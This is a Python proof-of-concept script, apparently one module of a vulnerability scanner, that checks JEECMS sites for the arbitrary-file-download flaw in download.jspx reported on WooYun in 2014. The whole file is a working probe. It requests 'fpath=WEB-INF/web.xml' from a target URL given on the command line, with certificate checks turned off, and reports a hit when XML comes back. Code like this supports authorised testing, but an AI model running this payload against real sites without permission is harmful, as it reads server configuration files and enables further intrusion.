#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: jeecms download.jsp 参数fpath任意文件下载
referer: http://www.wooyun.org/bugs/WooYun-2014-77960
author: Lucifer
description: 文件download.jsp中,参数fpath存在任意文件下载。
'''
import sys
import requests
import warnings
sys.path.append('../../') 
from color import *

class jeecms_fpath_filedownload:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                printGreen("[+]Success:存在jeecms download.jsp 参数fpath任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在jeecms_fpath_filedownload漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = jeecms_fpath_filedownload(sys.argv[1])
    testVuln.run()